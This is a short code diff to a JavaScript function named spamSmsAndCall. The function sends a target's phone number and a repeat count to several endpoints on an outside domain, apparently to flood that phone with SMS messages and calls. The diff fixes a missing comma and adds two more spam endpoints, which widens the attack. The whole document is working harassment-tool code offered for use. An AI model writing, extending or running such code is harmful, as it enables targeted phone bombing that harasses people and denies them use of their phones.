@@ -8,7 +8,7 @@ const urls = [
     'https://quang.nqtool.net/index2.php?',
     'https://quang.nqtool.net/index3.php?',
     'https://quang.nqtool.net/index4.php?',
-    'https://quang.nqtool.net/index5.php?'
+    'https://quang.nqtool.net/index5.php?',
     'https://quang.nqtool.net/index6.php?'
 ];
 
@@ -48,7 +48,9 @@ function spamSmsAndCall(phone, times, listItem) {
         `${urls[1]}phone=${phone}&amout=${times}`,
         `${urls[2]}phone=${phone}&amout=${times}`,
         `${urls[3]}phone=${phone}&amout=${times}`,
-        `${urls[4]}phone=${phone}&amout=${times}`
+        `${urls[4]}phone=${phone}&amout=${times}`,
+        `${urls[5]}phone=${phone}&amout=${times}`,
+        `${urls[6]}phone=${phone}&amout=${times}`
     ];
 
     Promise.all(urlsToFetch.map(url => fetch(url).then(response => response.json())))
